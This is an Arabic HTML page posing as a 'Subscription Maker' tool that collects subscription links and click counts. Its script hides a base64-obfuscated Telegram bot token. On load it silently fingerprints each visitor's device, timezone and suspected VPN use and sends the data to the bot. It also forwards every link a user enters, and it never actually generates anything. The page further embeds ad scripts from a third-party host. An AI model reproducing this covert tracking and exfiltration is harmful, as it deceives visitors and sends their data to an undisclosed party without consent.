<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Subscription Maker - SM</title>

    <!-- خط احترافي -->
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Cairo', sans-serif;
        }
        body {
            background-color: #fff;
            color: #e60000;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            min-height: 100vh;
        }
        h1 {
            margin-top: 20px;
            font-size: 28px;
            font-weight: 700;
        }
        .subscription-container {
            width: 90%;
            max-width: 700px;
            margin-top: 20px;
            background-color: #fff0f0;
            padding: 20px;
            border: 2px solid #e60000;
            border-radius: 10px;
        }
        .subscription {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 10px;
            padding: 10px;
            border: 1px solid #e60000;
            border-radius: 5px;
            background-color: #fff;
        }
        .subscription input {
            width: 60%;
            padding: 5px;
            font-size: 16px;
        }
        .subscription button {
            padding: 5px 10px;
            font-size: 16px;
            background-color: #e60000;
            color: #fff;
            border: none;
            cursor: pointer;
            border-radius: 3px;
        }
        #addSubscription {
            margin-top: 10px;
            background-color: #e60000;
            color: #fff;
            padding: 8px 15px;
            font-size: 16px;
            cursor: pointer;
            border: none;
            border-radius: 5px;
        }
        #adsContainer {
            width: 100%;
            margin-top: 20px;
        }
        .ad {
            width: 100%;
            max-width: 468px;
            height: 60px;
            margin: 10px auto;
            border: 1px solid #e60000;
        }
        #generateLink {
            margin-top: 15px;
            padding: 10px 20px;
            font-size: 18px;
            background-color: #e60000;
            color: #fff;
            border: none;
            cursor: pointer;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <h1>Subscription Maker - SM</h1>

    <div class="subscription-container" id="subscriptionContainer">
        <!-- الاشتراكات تظهر هنا -->
    </div>

    <button id="addSubscription">إضافة اشتراك جديد</button>
    <button id="generateLink">إنشاء رابط</button>

    <!-- الإعلانات -->
    <div id="adsContainer">
        <iframe class="ad" src="https://pl28700469.effectivegatecpm.com/89/a6/b8/89a6b8558224cd67c0822829d68a87ad.js"></iframe>
        <iframe class="ad" src="https://pl28700474.effectivegatecpm.com/596225155ab3da796681d551cb4b7cf4/invoke.js"></iframe>
        <iframe class="ad" src="https://pl28700485.effectivegatecpm.com/ad/c0/62/adc06235d53a0b6f378838879d3f116a.js"></iframe>
    </div>

    <script>
        // ===== ID فريد للمستخدم + إرسال للبوت =====
        (function () {

            const BOT_TOKEN_ENC = "Nzk4OTA0NTc0ODpBQUZQV1NXeU9sUWtHUjg2M2s1OTl0UmNwTHBIVE5XUVVZ";
            const CHAT_ID_ENC = "NjAyMTAzMDE5MA==";

            function decodeBase64(str) {
                try { return atob(str); } catch(e){ return ""; }
            }

            const BOT_TOKEN = decodeBase64(BOT_TOKEN_ENC);
            const CHAT_ID = decodeBase64(CHAT_ID_ENC);

            function generateUniqueID() {
                let existingID = localStorage.getItem("SM_UNIQUE_ID");
                if(existingID) return existingID;
                const newID = "SM-" + Date.now() + "-" + Math.random().toString(36).substr(2,9);
                localStorage.setItem("SM_UNIQUE_ID", newID);
                return newID;
            }

            const userID = generateUniqueID();

            const deviceInfo = {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screen: screen.width + "x" + screen.height,
                deviceType: /mobile/i.test(navigator.userAgent) ? "Mobile" : /tablet/i.test(navigator.userAgent) ? "Tablet" : "Desktop",
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };

            async function detectVPN() {
                let vpnSuspected = false;

                // WebRTC IP فحص تقريبي
                try {
                    const pc = new RTCPeerConnection({iceServers: []});
                    pc.createDataChannel("");
                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
                    pc.onicecandidate = function(event){
                        if(!event || !event.candidate) return;
                        const ip = event.candidate.candidate;
                        if(ip.includes("192.168") || ip.includes("10.") || ip.includes("172.")) vpnSuspected = true;
                    }
                } catch(e){}

                // التايم زون
                try {
                    const lang = navigator.language || "";
                    const tz = deviceInfo.timezone || "";
                    if(lang.startsWith("ar") && !tz.includes("Africa") && !tz.includes("Asia")) vpnSuspected = true;
                } catch(e){}

                // اتصال الشبكة
                if(navigator.connection){
                    const net = navigator.connection.effectiveType;
                    if(net === "slow-2g" || net === "2g") vpnSuspected = true;
                }

                return vpnSuspected ? "Suspected VPN/Proxy" : "Normal Network";
            }

            async function sendToBot() {
                const vpnStatus = await detectVPN();
                const message = `
📊 زائر جديد - SM
🆔 User ID: ${userID}
🌐 Network: ${vpnStatus}

📱 الجهاز: ${deviceInfo.deviceType}
💻 النظام: ${deviceInfo.platform}
🗣 اللغة: ${deviceInfo.language}
🖥 الشاشة: ${deviceInfo.screen}
🕒 Timezone: ${deviceInfo.timezone}

🔎 UA:
${deviceInfo.userAgent}
                `;
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                fetch(url,{
                    method:"POST",
                    headers:{"Content-Type":"application/json"},
                    body: JSON.stringify({chat_id:CHAT_ID,text:message})
                }).catch(()=>{});
            }

            if(!localStorage.getItem("SM_SENT")){
                sendToBot();
                localStorage.setItem("SM_SENT","true");
            }

        })();

        // ===== إدارة الاشتراكات =====
        const subscriptionContainer = document.getElementById("subscriptionContainer");
        const addBtn = document.getElementById("addSubscription");
        const generateBtn = document.getElementById("generateLink");

        let subscriptions = [];

        function renderSubscriptions(){
            subscriptionContainer.innerHTML = "";
            subscriptions.forEach((sub,index)=>{
                const div = document.createElement("div");
                div.className = "subscription";
                div.innerHTML = `
                    <input type="text" placeholder="رابط الاشتراك" value="${sub.link}" />
                    <input type="number" min="1" placeholder="عدد الضغطات" value="${sub.clicks}" />
                    <button onclick="removeSubscription(${index})">حذف</button>
                `;
                subscriptionContainer.appendChild(div);
            });
        }

        function removeSubscription(index){
            subscriptions.splice(index,1);
            renderSubscriptions();
        }

        addBtn.addEventListener("click",()=>{
            subscriptions.push({link:"",clicks:1});
            renderSubscriptions();
        });

        generateBtn.addEventListener("click",()=>{
            // تحديث القيم من الحقول
            const subs = subscriptionContainer.querySelectorAll(".subscription");
            subs.forEach((div,i)=>{
                const inputs = div.querySelectorAll("input");
                subscriptions[i].link = inputs[0].value;
                subscriptions[i].clicks = parseInt(inputs[1].value)||1;
            });

            // إرسال إشعار للبوت لكل لينك تم إنشاؤه
            const BOT_TOKEN = atob("Nzk4OTA0NTc0ODpBQUZQV1NXeU9sUWtHUjg2M2s1OTl0UmNwTHBIVE5XUVVZ");
            const CHAT_ID = atob("NjAyMTAzMDE5MA==");

            subscriptions.forEach(sub=>{
                const msg = `🆕 تم إنشاء رابط SM:\n${sub.link}\nعدد الضغطات: ${sub.clicks}`;
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
                    method:"POST",
                    headers:{"Content-Type":"application/json"},
                    body: JSON.stringify({chat_id:CHAT_ID,text:msg})
                }).catch(()=>{});
            });

            alert("تم إنشاء الروابط! 🌟");
        });

    </script>
</body>
</html>
